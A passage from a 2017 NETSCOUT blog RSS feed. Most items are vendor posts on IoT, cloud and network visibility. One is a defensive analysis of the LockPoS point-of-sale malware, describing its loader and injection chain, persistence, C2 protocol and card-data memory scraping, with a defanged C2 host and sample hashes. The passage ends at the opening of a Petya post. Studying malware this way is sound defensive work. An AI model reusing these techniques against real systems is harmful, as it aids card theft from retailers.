<p>While the benefits of IoT and the new services that it can enable will be attractive to enterprises and customer alike, the growth of IoT does present challenges around additional complexity. Every system upgrade, new connection or third party application added to existing IT infrastructure will increase complexity within the enterprise IT environment and the CIO must therefore take a management role through this transformation to ensure this increasingly complex environment does not descend into chaos.</p>

<p><strong>Through the Cloud to the Fog</strong></p>

<p>While the hybrid IT environment within any enterprises is already complex, the growth in IoT services adds another element into this already intricate mix. Cloud computing has proved a powerful enabler of many next generation services, but it is not specifically designed for IoT. Enterprises must also consider IoT edge computing introduced through initiatives such EdgeX Foundry and OpenFog Consortium for real-time applications.</p>

<p>According to the&nbsp;<a href="https://www.openfogconsortium.org/" target="_blank">Open Fog Consortium</a>, “Fog computing is a system-level horizontal architecture that distributes resources and services of computing and control, storage, networking and communications closer to the data sources.” The term was coined by Cisco and is an important consideration for enterprises as it essentially extends cloud services and capabilities to the network edge – crucial for the successful delivery and management of real-time IoT services, as rapid growth continues.</p>

<p>This is also an important consideration for the overall enterprise DX journey. At the centre of DX are a variety of new technologies that span the edge, core, datacentre, WAN and cloud of the service delivery infrastructure. These technologies are the foundation for the “Pillars of Innovation”; IoT is one of these, along with Big Data Analytics and Cloud, among others. The DX journey depends on constant innovation implemented through new business services, including IoT services. These are delivered via the Pillars of Innovation and must be future proof, infinitely scalable, while managing complexity as they expand. Speed and agility are also crucial as is the ability to visualize data in the context of the monitored services.</p>

<p><strong>Assuring IoT Services</strong></p>

<p>As we see further strong growth in IoT service delivery, it is important for enterprises that they do not lose visibility and control over the data and the quality of service delivery. The right approach to service assurance overcomes this challenge by providing a holistic visibility across the entire service delivery infrastructure. The analysis of the monitored data provides end-to-end visibility at an IoT service level, as well as across the service delivery network. This helps enterprises to simplify the complexity, mitigate risks, accelerate business agility and promote operational excellence. Translating real-time smart data into actionable insights is of huge strategic value to the enterprise as they face the increasing challenge of managing IoT networks and services.</p>

<p>The digital transformation is accelerating at pace and the IoT is one of the major drivers, which has far-reaching implications for enterprises in a variety of sectors. It is only through close monitoring and management of the transformation that the benefits of IoT services will be realized and the foundations of a successful business, driven by IoT, can be developed.<em>&nbsp;</em></p>

<p><strong>You can view this story on <a href="http://www.networkworld.com/article/3198987/internet-of-things/chaos-in-the-enterprise-managing-iot-services-across-edge-and-cloud.html" target="_blank">Network World.</a></strong></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/IoTandDX.jpg" length="207779" type="image/jpeg"/>
    <guid isPermaLink="false">fcfa29b5-b26e-43a9-b25d-a5148492a954</guid>
    <pubDate>Wed, 19 Jul 2017 13:25:39 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>Michael Segal</dc:creator>
    </item>
<item>
  <title>The Pace of Digital Transformation in Healthcare</title>
  <link>http://localhost:7996/blog/pace-digital-transformation-healthcare</link>
  <description>The business of healthcare has changed. Today’s healthcare organizations, much like any enterprise, depend wholeheartedly on technology. They live and breathe the many benefits of digital transformation (DX) and have steadily introduced new technologies to help deliver the end-goals of high quality patient care and greater operational efficiencies. Healthcare providers are now...</description>
  <content:encoded><![CDATA[<p>The business of healthcare has changed. Today’s healthcare organizations, much like any enterprise, depend wholeheartedly on technology. They live and breathe the many benefits of digital transformation (DX) and have steadily introduced new technologies to help deliver the end-goals of high quality patient care and greater operational efficiencies.</p>

<p>Healthcare providers are now improving patient care by adopting a variety of applications that demand trouble-free, real-time access to information in their IT environment. EHRs, imaging services, e-prescription services, BYOD initiatives, Wi-Fi expansion, and unified communications, coupled with telemedicine, are all, or will be, inextricably linked in the healthcare service-delivery chain. But they are stretching networks resources to capacity.</p>

<p>While there is no denying the positive impact DX is having, the challenge created at the same time, however, is increased complexity of the IT networks that power today’s healthcare organizations which are highly susceptible to performance issues. This, in turn, has led to a well-recognized need for greater visibility into the data crossing healthcare networks and a view of how to better manage the technology itself.</p>

<p><strong>DX Drivers</strong></p>

<p>In the current healthcare landscape, quick and efficient access to Electronic Medical Records (EMRs) is critical. Information sharing with imaging systems, scheduling software, and e-prescriptions is a necessity for efficient patient care and in many cases depend on Health Level 7 (HL7) as a standardized approach to multi-vendor, system-wide interoperability. This is going a long way towards making this target a reality in order to improve patient care.</p>

<p>While improving patient care has undoubtedly become a primary driver behind DX, it is only one piece of a much larger puzzle. With digital services already deeply integral to healthcare, spanning EMR/EHRs, digital imaging, e-prescription services, and unified communications, digital transformation is going to increasingly enhance and refine operational processes, improve the patient experience, and reduce costs. For example, one of the critical components for healthcare providers is the continuous availability for medical personnel to patient records for safe, informed treatment.</p>

<p>The ability to monitor, assess, and trend performance metrics and EHR activity (e.g. response time analysis) is crucial for successful clinical practice and health services to recognize when slowdowns are occurring so they can address them before the service becomes completely unavailable. In some countries it’s a regulatory requirement to ensure the availability of patient records to medical personnel for treatment and safety, e.g. HIPAA in the U.S.</p>

<p>Another benefit of monitoring healthcare networks and patient records is for visibility into nefarious activity within the network and from outsiders. Protecting patient health and financial data are part of the objectives of compliance with the Data Protection Act in the U.K., the Data Protection Directive in the EU, and HIPAA and PCI in the U.S. — and this can turn into a particularly complex situation.</p>

<p>In addition to applications and services being added, CIOs in healthcare organizations are faced with the pressing need to keep up with the pace of technology. As a result, they’re introducing next generation technologies in an attempt to improve overall efficiency, speed, and security of their networks. Developments in software defined data centers, network virtualization, cloud, and mobility are all contributing to this.</p>

<p>Healthcare organizations are increasingly building out new data centers to handle the ever-growing demands on their networks, and the applications and services they need to support. By capitalizing on real-time insights from their existing deployments and data pulled from their own network traffic, they can have a powerful view of how network performance will shape up before it’s even launched.</p>

<p>It also means new tools and services can be introduced with confidence, as the impact they’ll have on the network can be more accurately planned for ahead of time. This is particularly helpful as we continue to move towards virtualized network environments, with holistic network and application performance management becoming part of the building blocks of software-defined networking.</p>

<p><strong>The Importance Of Network And Application Visibility</strong></p>

<p>The reason it’s vital to have better insight into network and application performance of services across the network is due to how this environment is constantly changing. Unlike any other enterprise, healthcare organizations do not have a typical business day. There aren’t even regular users when you consider the infinite variety of physician and nurse schedules and the number/type of patients every day — making demand on the network and services unpredictable at best.</p>

<p>Protecting patient care in today’s hyper-connected world, then, depends almost entirely on protecting and optimizing the wired and wireless network and the services that run through them. Yet this challenge is amplified by the fact much of the functionality healthcare organizations rely on, including key services and applications, are multi-vendor. In any network environment that’s built upon stitching together siloed technologies, it’s essential to ensure everything is running smoothly and working together. It’s a tall order at the best of times, but one that’s made even more complicated when you add in how these services are running atop a combination of physical and virtualized environments, presenting additional challenges for network visibility.</p>

<p>These issues appear somewhat removed from the primary goal of improving the patient experience on the surface. However, when you look closer, any negative impact on the network quickly comes back full circle to the challenges associated with effectively caring for a patient. Any delays in access to information, from appointments to live diagnostic data, and from treatment to e-prescription services insurance approval to drug interactions, will impact their experience in a negative way. The reality is that even scheduled downtime is a major problem for healthcare organizations, so it’s no surprise the issue is amplified when it’s unscheduled from an application error or attack.</p>

<p>Healthcare organizations depend on high availability as they adopt new digital services, which are driving the industry’s critical need for visibility and service assurance before, during, and after implementing these transformative technologies.</p>

<p><strong>You can view this story on <a href="https://www.healthitoutcomes.com/doc/the-pace-of-digital-transformation-in-healthcare-0001" target="_blank">Health IT Outcomes</a><strong>.</strong></strong></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/digital_transformation_in_healthcare.jpg" length="102472" type="image/jpeg"/>
    <guid isPermaLink="false">ff92dd15-8401-480c-b818-9d0738263d27</guid>
    <pubDate>Wed, 19 Jul 2017 12:47:40 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>Eileen Haggerty</dc:creator>
    </item>
<item>
  <title>Implementing Hybrid Cloud Without Losing Speed &amp; Agility</title>
  <link>http://localhost:7996/blog/implementing-hybrid-cloud-without-losing-speed-agility</link>
  <description>When it comes to digital transformation (DX), the future belongs to the fast—and laggards risk being left in the dust. Recent research from Harvard Business Review shows that digital leaders significantly out-performed slow DX adopters in gross margins, earnings, and net income, despite similar IT spending patterns. Using key DX pillars like cloud to rapidly develop and deploy...</description>
  <content:encoded><![CDATA[<p>When it comes to digital transformation (DX), the future belongs to the fast—and laggards risk being left in the dust. <a href="https://enterprisersproject.com/sites/default/files/what_companies_on_right_side_digital_innovation_common.pdf" target="_blank">Recent research</a> from Harvard Business Review shows that digital leaders significantly out-performed slow DX adopters in gross margins, earnings, and net income, despite similar IT spending patterns. Using key DX pillars like cloud to rapidly develop and deploy new products and services, these companies have accelerated innovation and rebuilt business and operational models to support DX. Interestingly, many were not cloud-native operations, but rather older companies that successfully leveraged hybrid cloud environments. How did they manage to retain cloud’s speed and agility while operating in hybrid’s more complex environment?</p>

<p>It’s a pressing question, since hybrid adoption is in high-growth mode. The reality is, most companies already have extensive investments in on-premises systems and applications and don’t have the freedom to operate in cloud-native mode. Rather, they opt for hybrid, in which companies use private and public clouds, sometimes from more than one vendor, as well as on-premises infrastructure to deliver their services.</p>

<p>Therein lies the rub. To make the most of cloud’s elasticity, the entire infrastructure must operate at peak performance, and hybrid environments make it harder for enterprise IT organizations to control availability, reliability, and responsiveness. Cloud management platforms, which often cover only the cloud portion of an environment, do not allow companies to maintain control of enterprise-wide service assurance and hamper their ability to see across the entire service delivery infrastructure. Thus, companies struggle with limited visibility into the service delivery infrastructure and inadequate monitoring of network and application performance.</p>

<p>What are the implications of such limited visibility? Reduced performance and quality of service, increased exposure to risk, reduced savings, and the inability to consistently meet compliance regulations, just for starters. &nbsp;Without a window to see across the entire environment, enterprises cannot clearly assess service performance and identify security vulnerabilities. In a world marked by the notion that there is “no off,” the cost of ignoring such vulnerability could be significant. &nbsp;</p>

<p>Limited visibility also makes it difficult to extract full benefits from cloud investments, as slower performance inevitably cuts into the agility afforded by cloud’s instant elasticity. Moreover, cloud’s cost benefit may also erode: Without visibility into how applications consume cloud resources, organizations could end up paying higher hosting costs.&nbsp;</p>

<p>What sounds like a technical problem will have far-reaching business consequences when that deceleration plows into DX, which aims to deliver new and better applications faster than ever. &nbsp;As many companies have discovered, it’s not enough to deliver transformational customer and business services. For cloud-based disruption to work, you must deliver them well.</p>

<p>Therefore, building a service assurance strategy to manage the performance and security of the entire hybrid environment becomes a mission-critical business activity. If an enterprise turns to the cloud to support key business services and processes, it must find a way to gain complete visibility across the entire hybrid IT environment.</p>

<p>This is achieved by continuous end-to-end monitoring and real-time analysis of the traffic and application flows collected from hybrid cloud’s physical and virtual networks and applications. The analysis of the monitored data provides end-to-end service-level visibility and intelligence in hybrid cloud environments that simplify complexity, mitigate risks, accelerate business agility, and promote operational excellence. By using pervasive software-based instrumentation technology in the cloud, enterprises can retain the control over application and service assurance in hybrid cloud environments.</p>

<p><a href="https://www.netscout.com/sites/default/files/2017-06/ESG-Research-Insights-Report-NETSCOUT-Cloud-Challenges-Jun-2017.pdf"><strong>Download the report from The Enterprise Strategy Group</strong></a><strong> to find out why service and application assurance accelerates hybrid cloud adoption.</strong></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/hybrid-cloud-1200x480.jpg" length="227985" type="image/jpeg"/>
    <guid isPermaLink="false">f63ea867-28e5-43bd-acf5-5c74aa244e1f</guid>
    <pubDate>Mon, 17 Jul 2017 09:05:17 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>Michael Segal</dc:creator>
    </item>
<item>
  <title>NETSCOUT Packet Flow Visibility for Open Compute Platforms</title>
  <link>http://localhost:7996/blog/netscout-packet-flow-visibility-open-compute-platforms</link>
  <description>NETSCOUT recently announced new nGenius PFS 5000 network packet brokers based on off-the-shelf Open Compute platforms. While Big Switch Networks blazed this trail back in 2013 with the launch of its Big Monitoring Fabric, NETSCOUT, which sells a family of purpose-built network packet broker platforms, is embracing disruption by porting its packet flow visibility software to...</description>
  <content:encoded><![CDATA[<p>NETSCOUT recently announced new <a href="https://www.netscout.com/product/ngenius-5000-series-packet-flow-switch">nGenius PFS 5000</a>&nbsp;network packet brokers based on off-the-shelf Open Compute platforms. While Big Switch Networks blazed this trail back in 2013 with the launch of its Big Monitoring Fabric, NETSCOUT, which sells a family of purpose-built network packet broker platforms, is embracing disruption by porting its packet flow visibility software to white box switches, providing customers with a more cost-effective, easily scalable solution for network-wide visibility.</p>

<p>The benefits of this approach are described in the ACG white paper I authored:&nbsp;<a href="https://www.netscout.com/product/packet-flow-switches-and-taps">“Open Compute Platforms Power Software-Driven Packet Flow Visibility”</a>.</p>

<p>Note that while Big Switch’s BMF is based on the classic SDN architecture using a central controller and the OpenFlow protocol, NETSCOUT has taken a different approach with the PFS 5000, which is based on a fully distributed, mesh architecture that is self-organizing and self-healing.</p>

<p>It will be interesting to watch this market segment evolve as the power of switching platforms based on merchant silicon continues to increase and other network packet broker vendors embrace the disruption of Open Compute.</p>

<p><em>~ Stephen Collins,&nbsp;<a href="https://www.acgcc.com/analysts/" target="_blank">Principal Analyst, ACG Research</a></em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/pfs-5000-banner1200x480.jpg" length="90023" type="image/jpeg"/>
    <guid isPermaLink="false">8333f48f-dec3-4b18-892c-db725279c83b</guid>
    <pubDate>Wed, 12 Jul 2017 09:00:00 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>LockPoS Joins the Flock</title>
  <link>http://localhost:7996/blog/asert/lockpos-joins-flock</link>
  <description>While revisiting a Flokibot campaign that was targeting point of sale (PoS) systems in Brazil earlier this year, we discovered something interesting. One of the command and control (C2) servers that had been dormant for quite some time had suddenly woken up and started distributing what looks to be a new PoS malware family we’re calling LockPoS. This post opens the lock up and...</description>
  <content:encoded><![CDATA[<p>While revisiting a Flokibot campaign that was targeting point of sale (PoS) systems in Brazil earlier this year, we discovered something interesting. One of the command and control (C2) servers that had been dormant for quite some time had suddenly woken up and started distributing what looks to be a new PoS malware family we’re calling LockPoS. This post opens the lock up and takes a look inside.</p>

<h2>Loaders and Injectors</h2>

<p>The analyzed sample has a recent compilation date (2017-06-24) and is available on <a href="https://www.virustotal.com/en/file/063f14091c811feb0b99de21d52dc55ca2ccb0c387b515e7407ea09a4337ceef/analysis/">VirusTotal</a>. It starts out by resolving several Windows functions using API hashing (CRC32 is used as the hashing function). Here are a few of the functions and their corresponding hashes:</p>

<ul>
	<li>FindResourceW - 0xcad4de2b</li>
	<li>CryptDecrypt - 0x9c2d8fb5</li>
	<li>RtlDecompressBuffer - 0x52fe26d8</li>
</ul>

<p>As hinted by the above functions it continues by:</p>

<ul>
	<li>Extracting a resource named “CORE”</li>
	<li>Decrypting it using AES-256 in CBC mode and an initialization vector (IV) of all zero bytes</li>
	<li>Decompressing the plaintext</li>
</ul>

<p>The resulting file is an executable (available on <a href="https://www.virustotal.com/en/file/d2d444d9128ef8e177241b743d4383205f87657b91f4d208d7ffae8aeae53c5e/analysis/">VirusTotal)</a> that has the following debugging string:</p>

<pre>
<strong>C:\Users\Admin\Desktop\key\dropper\Release\dropper.pdb</strong></pre>

<p>This executable is manually loaded and executed. The self-named dropper continues by extracting a resource from itself named “XXXX”. This resource file contains multiple components, which are injected into “explorer.exe”. Once running in explorer.exe it behaves similarly to the above loader decrypting, decompressing, and loading the final LockPoS payload. To summarize, the loading and injecting process looks like:</p>

<ol>
	<li>Original executable loads dropper executable</li>
	<li>Dropper injects a second stage loader and the final LockPoS payload into explorer.exe</li>
	<li>The loader in explorer.exe loads the final LockPoS DLL.</li>
</ol>

<h2>LockPoS Component</h2>

<p>The analyzed LockPoS DLL is available on <a href="https://www.virustotal.com/en/file/93c11f9b87b2b04f8dadb6a579e2046a69073a244fd4a71a10b1f1fbff36c488/analysis/">VirusTotal</a> and has the following debugging string:</p>

<pre>
<strong>C:\Users\Admin\Desktop\key\lock\Release(DLL)\lock.pdb</strong></pre>

<p>LockPoS uses the regular “registry run” method for persistence. It obfuscates important strings using XOR and a key of “A”. An initial configuration (which includes the C2 URL) is stored unencrypted as a resource named “XXXX”:</p>

<p><img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/07/config-1024x252.png" /></p>

<p>The config is stored as a binary structure where the first DWORD (5 in this example) indicates the number of trailing data entries. Each data entry is composed of:</p>

<ul>
	<li>Type (DWORD)</li>
	<li>Data length (DWORD)</li>
	<li>Data</li>
</ul>

<p>For ease of use later, let’s call this structure a “data chunk”. C2 communications are via HTTP and using a very telling User-Agent. An example request looks like:</p>

<p><img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/07/phonehome_req-1024x367.png" /> The POST data is a structure consisting of “data chunks” which looks like this:</p>

<ul>
	<li>Number of data chunks (DWORD)</li>
	<li>Size of data chunk 1</li>
	<li>Data chunk 1</li>
	<li>Size of data chunk 2</li>
	<li>Data chunk 2</li>
	<li>…</li>
</ul>

<p>In the above example there is one data chunk that contains the following nine entries:</p>

<ol>
	<li>Type 0: Message type (0)</li>
	<li>Type 3: String consisting of username, computer name, and bot ID</li>
	<li>Type 1: Value from the config</li>
	<li>Type 2: Bot version (1.0.0.6)</li>
	<li>Type 8: CPU</li>
	<li>Type 9: Physical memory</li>
	<li>Type 10: Display devices</li>
	<li>Type 4: Windows version and architecture</li>
	<li>Type 6: MD5 hash of currently running sample</li>
</ol>

<p>An example response from the C2 looks like this: <img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/07/resp.png" /></p>

<p>The returned data, like the request data, is structured and in this case is returning an updated config. LockPoS supports the following commands:</p>

<ul>
	<li>Update config</li>
	<li>Download and execute</li>
	<li>Rotate data file</li>
	<li>Update self</li>
	<li>Inject executable file into explorer.exe</li>
</ul>

<p>The malware’s PoS credit card stealing functionality works similarly to other PoS malware: it scans the memory of other running programs looking for data that matches <a href="https://en.wikipedia.org/wiki/Magnetic_stripe_card#Financial_cards">what credit card track data looks like</a>. Here’s a snippet of the matching function:</p>

<p><img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/07/memscraping-1024x511.png" /></p>

<p>Using some example credit card track two data <a href="http://www.gae.ucm.es/~padilla/extrawork/magexam1.html">from this site</a>, here is an example credit card exfiltration by LockPoS:</p>

<p><img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/07/exfil-1024x433.png" /></p>

<p>In this example there are two data chunks. The first is similar to the phone home example above. The second data chunk consists of the following seven entries:</p>

<ol>
	<li>Type 0: Message type (2)</li>
	<li>Type 113: Tick count</li>
	<li>Type 111: Hardcoded zero</li>
	<li>Type 112: Credit card track data and application it came from</li>
	<li>Type 3: String consisting of username, computer name, and bot ID</li>
	<li>Type 1: Value from the config</li>
	<li>Type 114: Index of the entry</li>
</ol>

<h2>Conclusion</h2>

<p>So far, we’ve seen LockPoS distributed via a Flokibot botnet (a reference sample is available on <a href="https://www.virustotal.com/en/file/a970842fc7c221fade06c54551c000c0bc494e9e188deb9c570be7c6f95284fa/analysis/">VirusTotal</a>). They both share a common C2 host (treasurehunter[.]at) so it is likely the same threat actor controls them. As referenced earlier, the Flokibot campaign was targeting Brazil so a good first guess is that LockPoS will target the same. One thing to note about the analyzed C2 server (treasurehunter[.]at) is that there is a name overlap with another PoS malware that FireEye <a href="https://threatpost.com/pos-malware-tool-treasurehunt-targets-small-us-based-banks-retailers/117014/">wrote</a> about in 2016 called TREASUREHUNT. Based on their research on its C2 communications, panel, and other IoCs it looks like LockPoS and TREASUREHUNT are separate families. It is currently unclear whether LockPoS is an exclusive malware associated with one threat actor or whether it will be sold on underground forums like Flokibot was. Based on the internals of the malware described in this post, LockPoS seems to be coded well and stable, but doesn’t particularly raise the bar when it comes to “highly advanced malware”. However, given the havoc PoS malware has inflicted on the hotel, restaurant, and retail industries the past few years, LockPoS’ lack of novelty is probably a moot point.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <enclosure url="http://localhost:7996/sites/default/files/treasure_hunter.png" length="161823" type="image/png"/>
    <guid isPermaLink="false">167f17b0-209b-4e22-a00e-b3a22827adec</guid>
    <pubDate>Wed, 12 Jul 2017 08:11:56 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>ASERT Team</dc:creator>
    </item>
<item>
  <title>Juniper’s Cloud-Grade networking aims</title>
  <link>http://localhost:7996/blog/junipers-cloud-grade-networking-aims</link>
  <description>Moving services to the cloud should not mean sacrificing high-quality service delivery. Customers won't tolerate poor service unless it's free. Carrier-grade means extremely high availability for service uptime. But to deliver carrier-grade service quality means that the carrier or cloud service provider has full visibility to all services and can be proactive to avoid and...</description>
  <content:encoded><![CDATA[<p>Moving services to the cloud should not mean sacrificing high-quality service delivery. Customers won't tolerate poor service unless it's free. Carrier-grade means extremely high availability for service uptime. But to deliver carrier-grade service quality means that the carrier or cloud service provider has full visibility to all services and can be proactive to avoid and reduce service degradation and outages.</p>

<p>There should be no question in anyone’s mind that the cloud era has arrived. Businesses are adopting the cloud at an unprecedented rate and by 2020, the number of cloud workloads will be on par with the number of on-premises ones.</p>

<p>Businesses of all sizes are turning to the cloud to help them become digital by increasing the level of agility. To be an agile business, though, the entire network stack—from the network through applications must be agile.</p>

<p>+ Also on Network World:&nbsp;<a href="http://www.networkworld.com/article/3164345/cloud-computing/juniper-heads-to-the-clouds-with-unite.html" target="_blank">Juniper heads to the clouds with Unite</a> +</p>

<p>However, organizations are also more cost conscious than ever, so whatever solution is deployed must save money in addition to making the network more dynamic.&nbsp;</p>

<p>Last week, Juniper Networks announced its “Cloud-Grade” network offerings, which brings together carrier-grade reliability and enterprise-class control and usability to bring a new approach to how applications are secured, delivered and managed. Specifically, Juniper has brought together telemetry and machine learning capabilities from its carrier business with ease of use and automation from enterprise products.</p>

<p>However, instead of giving some grandiose vision of the world as it could be, Juniper is looking to solve some specific problems related to agility, such as keeping the innovation train running while controlling network costs and making the most of existing assets.</p>

<p>Cloud-grade introduces something called “Junos Node Slicing,” which enables service providers and large enterprises to run multiple instances or Junos services on a single router. This is more than run-of-the-mill, vanilla network functions virtualization (NFV), as each Junos Node has its own administrative domain. A good way to think about this is it brings to the router the benefits that virtualization brought to servers, making the network more agile, making resources efficient and enabling organizations to deploy new services fast because no new hardware is required.</p>

<p>Juniper is also introducing its “Universal Chassis,” which is a single platform that can run line cards from its PTX, QFX and MX series of products. Although one can’t mix and match cards yet, it does let organizations standardize on a single form factor from router and switching from the data center to the network edge. A big initiative for many organizations is to simplify network complexity, and while the Universal Chassis certainly isn’t a panacea to all network woes, the decoupling of the line cards from the physical chassis creates more options while maintaining homogeneity across the network.</p>

<p>The road to self-driving networks</p>

<p>The company also outlined a practical roadmap to help with the journey to a self-driving network. Companies didn’t go from mainframes to PCs or token ring to Ethernet overnight, and they wont go from manual operations to self driving in one fell swoop.</p>

<p>Juniper’s vision of an autonomous network starts with establishing baselines and automating basic tasks. The next step would be to introduce telemetry information and integration into IT infrastructure and so on until the company is able to achieve the full vision. The below graphic shows all the steps in the journey.&nbsp;</p>

<p>For companies that can’t do this trip on their own, Juniper has introduced new professional services that can step customers through every step along the way.&nbsp;</p>

<p>Updates to NorthStar SDN Controller</p>

<p>Lastly, the company has introduced several new updates to its NorthStar SDN Controller that bring greater visibility to network traffic. It’s very difficult for companies to manage or secure their environments unless they can see what’s happening, and NorthStar can be used to monitor traffic in real time, optimize the network through analytics and provide better data for capacity planning.</p>

<p>Businesses will continue to accelerate their path to the cloud, driving bandwidth to unprecedented levels. Organizations that want to maximize their cloud investments should also re-think their network strategies. For Juniper customers, Cloud-Grade brings a number of new capabilities without breaking the bank.</p>

<p class="nc_attribution_text">This article was written by Zeus Kerravala from <a href="http://www.networkworld.com/article/3203387/lan-wan/junipers-cloud-grade-networking-aims-to-deliver-network-agility.html" target="_blank">NetworkWorld</a> and was legally licensed through the <a href="https://www.newscred.com/" target="_blank">NewsCred</a> publisher network. Please direct all licensing questions to <a href="mailto:legal@newscred.com">legal@newscred.com</a>.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/image.jpg" length="129117" type="image/jpeg"/>
    <guid isPermaLink="false">a4a1f7c4-75a8-4732-b95e-4d7a83cca480</guid>
    <pubDate>Thu, 06 Jul 2017 11:00:00 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Making the Invisible Visible for Service Providers</title>
  <link>http://localhost:7996/blog/making-invisible-visible-service-providers</link>
  <description>With Network Function Virtualization/Software-Defined Networking (NFV/SDN), it is no longer possible to tap into physical gigabyte IP-links to access network traffic with traditional packet broker products to aggregate traffic into InfiniStream to create our ASI metadata to feed nGeniusONE.</description>
  <content:encoded><![CDATA[<p>With Network Function Virtualization/Software-Defined Networking (NFV/SDN) or simply network virtualization, it is no longer possible to tap into physical gigabyte IP-links to access network traffic with traditional packet broker products to groom and aggregate traffic into InfiniStream to create our patented Adaptive Service Intelligence (ASI) metadata to feed nGeniusONE. With virtualization or the cloud, network functions and applications are disaggregated or broken down into modules called microservices to facilitate their operation on common off-the-shelf computing platforms (COTS). These microservices can run on various servers, spinning up in concert to form a service or network nodes, expanding and adding compute resources as demand grows or contracting in kind, and spinning down as demand recedes. With virtualized functions and services distributed randomly in COTS servers in virtualized networks and in cloud networks service providers have virtually no visibility to monitor their performance or to troubleshoot them.</p>

<p>To address this challenge, NETSCOUT developed a software version of our products and announced in June 2017 the general availability of vSCOUT™, vSTREAM™ and virtual <a href="https://www.netscout.com/product/enterprise/ngeniusone-service-assurance-platform/?ls=PR-MKTG&amp;lsd=pr-060617-2">nGeniusONE</a>®. These new software based products form a radical new evolution of our product line. While we still sell the “physical” versions of these products, i.e., the product software integrated on packaged hardware, we now offer service providers (and enterprise businesses for the cloud) the option to buy software-only versions of the products.</p>

<p>vSCOUT provides deep visibility into the virtual infrastructure as it can be deployed directly at the virtual machine instance of a (micro) service. vSCOUT has a dual function as both packet forwarder and as a “mini” InfiniStream that delivers a high-level set of Key Performance Indicators (KPIs). To function at that micro level vSCOUT uses a bare minimum of compute resources and has a unique pricing model that makes it the most cost effective monitoring product in the market.</p>

<p>vSCOUT is designed to work in tandem with vSTREAM by funneling packets seen at that virtual machine level to the vSTREAM.&nbsp; The vSTREAM is, for all practical purposes, a fully functional form of InfiniStream. It is a scalable product that can be assigned a range of compute resources making it flexible and cost effective to deploy in virtual and cloud environments.</p>

<p>Another intended use of our virtual instrumentation products is to become part of the feedback loop for the orchestration layer in NFV/SDN networks. The orchestration layer, as the name implies, directs the assignment of compute resources to bring microservices together in concert and to scale them up or down. Being deployed within the fabric of the virtual infrastructure, vSCOUT and vSTREAM will be able to send information to the orchestrator on the condition of the microservices, such as utilization, latency, and errors to provide indications whether to spin up (or spin down) additional compute resources in response to demand and/or resource performance. At the same time, through the KPIs derived from vSCOUT and vSTREAM, Network Operations and Engineering teams will have visibility to determine the health of a given service and access to the service triage tools of nGeniusONE.</p>

<p>What makes our new, virtualized products truly market leading is their Affordability (Total Cost of Ownership (TCO), Carrier Class Scalability, and our Domain Expertise as the service provider service assurance leader. With our ASI smart data derived from this virtual instrumentation, we bring speed, agility, and confidence to service providers virtualizing the network. With the visibility vSCOUT and vSTREAM bring with ASI and the analytics of nGeniusONE, service providers have powerful tools to aid in their transition to virtualization and the cloud and assure high-quality service delivery.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/pfs-product-bg1200x480.jpg" length="329673" type="image/jpeg"/>
    <guid isPermaLink="false">915d3f35-c256-42cb-858a-92e035b4dc85</guid>
    <pubDate>Fri, 30 Jun 2017 12:26:22 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>John English</dc:creator>
    </item>
<item>
  <title>Patching Not Enough to Stop Petya</title>
  <link>http://localhost:7996/blog/asert/patching-not-enough-stop-petya</link>
  <description>Voluminous amounts of information have already been disseminated regarding the “Petya” (or is it “NotPetya”? [1]) ransomware that hit the Ukraine hard [2] along with organizations such as “the American pharmaceutical giant Merck, the Danish shipping company AP Moller-Maersk, the British advertising firm WPP, Saint-Gobain of France, and the Russian steel, mining and oil firms...</description>
  <content:encoded><![CDATA[<p>Voluminous amounts of information have already been disseminated regarding the “Petya” (or is it “NotPetya”? [1]) ransomware that hit the Ukraine hard [2] along with organizations such as “the American pharmaceutical giant Merck, the Danish shipping company AP Moller-Maersk, the British advertising firm WPP, Saint-Gobain of France, and the Russian steel, mining and oil firms Evraz and Rosneft” [3].</p>

<p>Not surprisingly, nearly every Petya write-up references the WannaCry outbreak that wreaked havoc about a month-and-a-half ago. This is reasonable given the recentness of WannaCry and that both malwares are ransomware known to leverage the EternalBlue exploit against patched vulnerability MS17-010 [4].</p>

